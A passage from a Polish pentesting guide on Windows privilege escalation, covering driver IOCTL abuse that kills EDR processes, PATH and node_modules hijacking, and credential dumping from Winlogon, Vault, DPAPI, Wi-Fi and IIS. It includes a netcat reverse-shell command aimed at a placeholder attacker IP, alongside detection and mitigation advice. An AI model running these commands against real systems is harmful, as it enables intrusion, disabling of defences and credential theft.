- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacku/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni zakłada, że `EntryContext` wskazuje na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowany przez atakującego `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie użyje tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, co prowadzi do częściowo kontrolowanego zapisu w kernelu.
- **`REG_BINARY`**: dla dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej skalarniej kontrolowaną przez atakującego **ujemną** wartość, kolejne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio na sąsiednie pola na stosie. Jest to często najprostsza droga do pełnego nadpisania wskaźnika callbacku.

Przydatny wzorzec podczas wyszukiwania: **niejednorodne odczyty z rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Wyszukuj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używane wskaźniki `EntryContext` oraz ścieżki kodu, w których pierwszy odczyt z rejestru decyduje o wykonaniu drugiego.

#### Wykorzystanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + wyłączenie EDR)

Niektóre podpisane sterowniki firm trzecich tworzą swoje obiekty urządzeń z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie jest otwierane za pomocą ścieżki zawierającej dodatkowy składnik. Dzięki temu dowolny nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może już otworzyć urządzenie, może wykorzystać udostępnione przez sterownik uprzywilejowane IOCTL-e do uzyskania LPE i manipulacji. Przykładowe możliwości zaobserwowane w rzeczywistych przypadkach:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokenu / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowego dysku (manipulacje offline, sztuczki zapewniające trwałość przy rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala wyłączyć AV/EDR z poziomu user land za pośrednictwem kernela.

Minimalny schemat PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla deweloperów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być chronione przez DACL.
- Weryfikuj kontekst wywołującego przy operacjach uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele z brokerem zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie podejrzanych nazw urządzeń w trybie użytkownika (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj stosowanie listy blokowanych podatnych sterowników Microsoftu (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych sterowników.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH**, możesz przejąć kontrolę nad biblioteką DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów w PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w systemie Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezpośredni, taki jak `require("foo")`, a oczekiwany moduł **nie istnieje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W systemie Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik o niskich uprawnieniach** może utworzyć `C:\node_modules`, może umieścić w nim złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie wykonany w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, jeśli proces docelowy działa jako administrator, jako podwyższone zadanie zaplanowane lub usługa albo jako automatycznie uruchamiana aplikacja pulpitu z podwyższonymi uprawnieniami.

Zdarza się to szczególnie często, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet usunięto z kompilacji produkcyjnych, pominięto podczas pakowania lub nie udało się go zainstalować
- podatny `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę wyszukiwania:<sup>[[23]](#references)</sup>

- Filtruj według `Process Name` = plik wykonywalny procesu docelowego (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Filtruj według `Path` `contains` `node_modules`
- Zwróć uwagę na `NAME NOT FOUND` oraz ostatnie pomyślne otwarcie w `C:\node_modules`

Przydatne wzorce do wyszukiwania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **brakującą nazwę pakietu** na podstawie Procmon lub przeglądu kodu źródłowego.
2. Utwórz główny katalog wyszukiwania, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a właściwego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **bare import**, którego brakuje, a który uprzywilejowany proces Node/Electron w systemie Windows spróbuje rozwiązać.

### Wykrywanie i wzmacnianie zabezpieczeń

- Generuj alerty, gdy użytkownik utworzy `C:\node_modules` lub zapisze tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące pliki z `C:\node_modules\*`.
- Dołączaj wszystkie zależności środowiska uruchomieniowego w środowisku produkcyjnym i kontroluj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne testy, jeśli biblioteka to umożliwia (na przykład niektóre wdrożenia `ws` mogą pominąć starszy test `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts nie są na sztywno wpisane inne znane komputery.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź **usługi o ograniczonym dostępie** z zewnątrz.

```bash
netstat -ano #Opened ports?
```

Dla lokalnego listenera powiąż jego PID z właścicielem procesu, ścieżką pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako użytkownik pulpitu tylko wtedy, gdy pozwalają na to jej uwierzytelnianie i mechanizmy kontroli poleceń. Niestandardowa aplikacja TCP uruchomiona z wyższymi uprawnieniami wymaga osobnej analizy: listener i ścieżka pliku binarnego to jedynie pasywne wskazówki, natomiast wykorzystanie błędu uszkodzenia pamięci po uwierzytelnieniu wymaga analizy dokładnie tego pliku binarnego i danych wejściowych, do których można uzyskać dostęp. Jeśli wygląda na to, że ujawniony port należy do procesu systemowego, sprawdź jego powiązanie z usługą backendową za pomocą [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tablica routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory sieciowej

[**Sprawdź tę stronę, aby znaleźć polecenia związane z zaporą sieciową**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarny plik `bash.exe` można znaleźć również w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się okno GUI z pytaniem, czy zezwolić `nc` na działanie przez zaporę).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia `root` w systemie Linux działającym w WSL same w sobie nie nadają uprawnień Administratora systemu Windows. Jeśli bieżąca tożsamość systemu Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające; eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), więc najpierw ustal rzeczywistą dystrybucję i ścieżkę przechowywania danych. Unikaj wyświetlania zawartości historii podczas automatycznego wyliczania.

## Poświadczenia systemu Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie dane uwierzytelniające. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza znalezienie hasła w postaci jawnego tekstu w rejestrze. Jeśli `AutoAdminLogon=1`, ale nie można odczytać żadnego hasła w postaci jawnego tekstu, jest to jedynie wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala stwierdzić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia danych uwierzytelniających sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z artykułu [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników dotyczące serwerów, witryn internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na początku może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, aby przeglądarki logowały ich automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja systemu Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny internetowej), **może korzystać z tego Menedżera poświadczeń** i Windows Vault oraz używać zapisanych poświadczeń zamiast za każdym razem prosić użytkowników o nazwę użytkownika i hasło.

O ile aplikacje nie współpracują z Menedżerem poświadczeń, nie sądzę, aby mogły używać poświadczeń przypisanych do danego zasobu. Jeśli więc aplikacja ma korzystać z vault, powinna w jakiś sposób **komunikować się z Menedżerem poświadczeń i pobierać z domyślnego magazynu vault poświadczenia dotyczące danego zasobu**.

Użyj `cmdkey`, aby wyświetlić poświadczenia zapisane na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład uruchamia zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanymi poświadczeniami.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające i hasła w postaci jawnego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP) (widocznym również jako `Web Credentials` w `vaultcmd`). Ta przestrzeń magazynowa jest izolowana dla sesji i można ją odszyfrować natywnie bez uprawnień administracyjnych ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci jawnego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, aby znacząco zwiększyć entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z sekretów logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, szyfrowane za pomocą DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, ale można ją wyświetlić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane w **skryptach** i zadaniach automatyzacji, aby wygodnie przechowywać zaszyfrowane dane uwierzytelniające. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Gdy skrypt lub inwentaryzacja plików wskaże taki plik, ustal rzeczywisty katalog profilu konta zamiast zakładać, że jest to `C:\Users`: [system Windows może umieszczać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Czytelny plik jest jedynie wskazówką; [funkcja Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, z których zostało wyeksportowane](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a każde odzyskane konto musi mieć osobno odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając zaszyfrowanych ani jawnych wartości podczas rutynowej inwentaryzacji.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu `dpapi::rdg` programu **Mimikatz** z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu `sekurlsa::dpapi` programu Mimikatz

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Documents użytkownika, w tym pliki o zwyczajnych nazwach, takich jak `config.xml`. Ustal schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za trop dotyczący poświadczeń. Zapisana wartość nie jest hasłem DPAPI/RDCMan; możliwość jej odzyskania zależy od ustawień szyfrowania pliku i od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego przeszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być też czytelne w katalogach użytkownika lub współdzielonym folderze administracyjnym. Eksport `profiles.xml` w starszym formacie zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako trop dotyczący poświadczeń, ale nie wyświetlaj go ani nie zakładaj, że zawiera tekst jawny: [informacje dostawcy](https://www.donkz.nl/) wskazują, że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, lub skonfigurowana mniej restrykcyjnie. Zanim na nim polegniesz, potwierdź pochodzenie pliku i warunki jego odzyskania.

### Sticky Notes

Użytkownicy często korzystają z aplikacji StickyNotes na stacjach roboczych Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że są one przechowywane w pliku bazy danych. Plik ten znajduje się pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać oraz sprawdzić.

Użytkownicy czasem zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Aplikacja Sticky Notes dołączana do pakietu Microsoft zwykle przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać innych magazynów w profilu użytkownika, w tym LevelDB. Ustal, jaka aplikacja jest zainstalowana i jakiego formatu używa, zanim uznasz brak pliku SQLite za dowód braku notatek.

Jeśli Sticky Notes używa dziennika zapisu z wyprzedzeniem SQLite (WAL), sama kopia `plum.sqlite` może nie zawierać ostatnich zatwierdzonych notatek. Zachowaj odpowiadający jej plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych i dołącz `plum.sqlite-shm`, jeśli jest dostępny; indeks w pamięci współdzielonej można odbudować, ale WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło to jedynie trop dotyczący poświadczeń: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji specyficznej dla aplikacji, zanim będzie można uznać go za dowód logowania z wyższymi uprawnieniami.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz być Administratorem i uruchomić program z poziomem integralności High.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano pewne **poświadczenia**, które można **odzyskać**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe`.\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (poświadczenia)

### Artefakty poświadczeń narzędzi wsparcia zdalnego w rejestrze

Niektóre starsze instalacje oprogramowania do zdalnego wsparcia zachowują nazwy wartości związanych z hasłami w ustalonych kluczach rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewerze wskazywało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości jest jedynie wskazówką do dalszej weryfikacji: przed oceną tych poświadczeń sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżący sposób uwierzytelniania. Wykorzystanie hasła do zdalnego wsparcia w celu uzyskania dostępu do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła i uprawnień do tego konta. Nie umieszczaj zaszyfrowanych danych ani odzyskanych haseł w standardowych wynikach enumeracji.

### Współdzielone arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny współdzielony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft podaje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczeń; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Przeglądaj wyłącznie pliki, do których masz uprawnienia i które są istotne, a podczas szerokiej enumeracji unikaj wyświetlania potencjalnych sekretów. Sama ścieżka do czytelnego pliku `.xlsx`, chroniony arkusz ani ukryta kolumna nie dowodzą, że istnieją poświadczenia lub że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian serwera CI

